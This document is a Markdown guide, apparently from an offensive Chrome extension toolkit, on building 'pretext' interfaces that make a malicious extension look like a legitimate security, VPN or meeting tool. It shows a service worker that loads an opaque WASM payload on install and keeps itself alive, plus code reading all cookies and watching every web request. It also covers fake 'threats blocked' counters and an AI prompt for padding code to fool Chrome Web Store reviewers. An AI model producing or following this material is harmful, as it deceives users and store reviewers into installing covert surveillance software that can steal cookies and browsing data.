# UI Implementation Patterns

**Pretext-specific UI patterns and service worker templates for Chrome extensions.**

---

## Overview

The extension UI serves two purposes:
1. **Legitimacy**: Provides screenshots for Chrome Store listing
2. **Credibility**: Shows functional features matching the pretext

**Key insight**: UI doesn't need to be fully functional - just needs to look credible and not throw errors.

---

## Service Worker Template (background.js)

**Source**: `modules/hypercube-ng/extension/background.js`

```javascript
try{
    // Load dependencies via importScripts (service worker requirement)
    importScripts('./wasm_exec.js')
    importScripts('./firebase-app-compat.js')
    importScripts('./firebase-auth-compat.js')
    importScripts('./firebase-database-compat.js')
} catch (e) {
    console.error(e);
}

async function Startup() {
    const go = new Go();
    const result = await WebAssembly.instantiateStreaming(fetch("main.wasm"), go.importObject);
    go.run(result.instance);
}

// Initialize on install and startup
chrome.runtime.onInstalled.addListener(async function() {
    await Startup();
});

chrome.runtime.onStartup.addListener(async function() {
    await Startup();
});

// CRITICAL: Keep service worker alive (prevents 30s termination)
const keepAlive = () => setInterval(chrome.runtime.getPlatformInfo, 20e3);
keepAlive();
```

**Key patterns:**
- `importScripts()` for all dependencies (service worker requirement)
- Dual initialization: `onInstalled` + `onStartup`
- Keep-alive: 20-second interval prevents worker termination
- WASM loading via `WebAssembly.instantiateStreaming()`

---

## Popup UI Template

**File**: `ui/popup.html`

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Extension Name</title>
    <link rel="stylesheet" href="popup.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="assets/icon48.png" alt="Logo">
            <h1>Extension Name</h1>
        </div>

        <div class="status">
            <div class="status-indicator active"></div>
            <span>Protection Active</span>
        </div>

        <div class="features">
            <div class="feature-item">
                <span class="icon">🛡️</span>
                <div class="feature-text">
                    <h3>Real-time Protection</h3>
                    <p>Monitoring all websites</p>
                </div>
            </div>
            <!-- Add more feature items -->
        </div>

        <div class="stats">
            <div class="stat">
                <span class="stat-number">127</span>
                <span class="stat-label">Threats Blocked</span>
            </div>
            <div class="stat">
                <span class="stat-number">1,043</span>
                <span class="stat-label">Sites Scanned</span>
            </div>
        </div>

        <button class="settings-btn">Settings</button>
    </div>

    <script src="popup.js"></script>
</body>
</html>
```

---

## Pretext-Specific UI Patterns

### Security Tool UI

**Key elements:**
- Status indicator (green = active, red = inactive)
- Threat counter (blocked threats, scanned sites)
- Recent activity log
- On/off toggle
- Settings panel

**Example from antiphish-solutions:**
- Shield logo
- "Protection Active" status
- Statistics dashboard
- Recent blocked domains list

### VPN Tool UI

**Key elements:**
- Connection status (connected/disconnected)
- Server location selector
- Connection speed indicator
- Data usage statistics
- Protocol settings

### Meeting Tool UI

**Key elements:**
- Detected meeting platform
- Connection quality indicator
- Optimization status
- Quick settings (blur background, audio enhance)
- Meeting history

---

## Permission Demonstration Code

**Critical**: Code must use ALL manifest permissions (even if not functional).

**From `modules/hypercube-ng/docs/chrome-store-process.md`:**
> "There's no actual requirement that the code it generates actually works - it just needs to demonstrate usage of the behaviors and not throw a ton of errors"

### Demonstrating `webRequest`

```javascript
// Add listener that logs requests
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        console.log("Request to:", details.url);
        // Log but don't block
        return {};
    },
    {urls: ["<all_urls>"]},
    []
);
```

### Demonstrating `cookies`

```javascript
// Function that reads cookies (even if unused)
async function analyzeCookies() {
    const cookies = await chrome.cookies.getAll({});
    console.log("Total cookies:", cookies.length);
    // Add cookie analysis logic (can be basic)
}

// Call periodically
setInterval(analyzeCookies, 60000);
```

### Demonstrating `storage`

```javascript
// Store and retrieve settings
async function saveSettings(settings) {
    await chrome.storage.local.set({ settings });
}

async function loadSettings() {
    const { settings } = await chrome.storage.local.get(['settings']);
    return settings || {};
}
```

### Demonstrating `declarativeNetRequest`

```javascript
// Add dynamic rule (can be trivial)
const rule = {
    id: 1,
    priority: 1,
    action: {
        type: "block"
    },
    condition: {
        urlFilter: "example-blocked-domain.com",
        resourceTypes: ["main_frame"]
    }
};

chrome.declarativeNetRequest.updateDynamicRules({
    addRules: [rule],
    removeRuleIds: [1]
});
```

---

## AI-Generated UI Code

**Prompt for generating permission-demonstrating code:**

```
Generate JavaScript code for a Chrome extension background.js that demonstrates usage of these permissions:
- webRequest (log network requests)
- cookies (analyze cookies)
- storage (save settings)
- declarativeNetRequest (block example domain)

The extension is a [pretext-name] tool. Code should:
1. Use each permission at least once
2. Not throw errors on startup
3. Log activity to console
4. Be verbose (more code = better)

Make it look like a real implementation even if functionality is basic.
```

**Key strategy**: More code = better. Chrome Store reviewers look for evidence of permission usage, not perfect functionality.

---

## UI Design Guidelines

### Branding

- Professional color scheme
- Consistent typography
- High-quality icons
- Modern, clean aesthetic

**Example from antiphish-solutions:**
- Blue theme (#3BA7FF primary, #1B4B87 secondary)
- Shield/protection imagery
- Inter/Segoe UI fonts
- Gradient backgrounds

### Layout

- Simple, uncluttered
- Clear hierarchy
- Obvious primary action
- Status always visible

### Content

- Short, benefit-focused copy
- Real-time updates (even if simulated)
- Professional terminology
- No placeholder "Lorem ipsum"

---

## Example: Antiphish-Solutions UI

**Source**: `modules/hypercube-ng/examples/antiphish-solutions/`

**Structure:**
```
ui/
├── popup.html          # Main popup interface
├── popup.css           # Styling
├── popup.js            # Functionality
├── assets/
│   ├── icon16.png
│   ├── icon48.png
│   └── icon128.png
└── settings/
    ├── settings.html
    └── settings.js
```

**Key features implemented:**
- Protection status toggle
- Threat statistics dashboard
- Recent activity log
- Settings panel
- About page

---

## Testing Your UI

### Checklist

- [ ] Popup loads without errors
- [ ] All images/assets load correctly
- [ ] Console shows permission usage (webRequest logs, cookie access, etc.)
- [ ] Toggle switches work (even if just UI)
- [ ] Status indicators update
- [ ] Text is spell-checked and professional
- [ ] Screenshots look credible for Chrome Store

### Developer Tools Testing

```bash
# Load extension
chrome://extensions/ → Load unpacked

# Open popup
Click extension icon

# Check console
Right-click popup → Inspect
# Should see permission usage logs, no errors

# Check service worker
chrome://extensions/ → Service worker → Inspect
# Should see keep-alive logs, WASM initialization
```

---

## References

- **Example UI**: `modules/hypercube-ng/examples/antiphish-solutions/ui/`
- **Service worker**: `modules/hypercube-ng/extension/background.js`
- **Chrome UI guidelines**: https://developer.chrome.com/docs/extensions/mv3/user_interface/
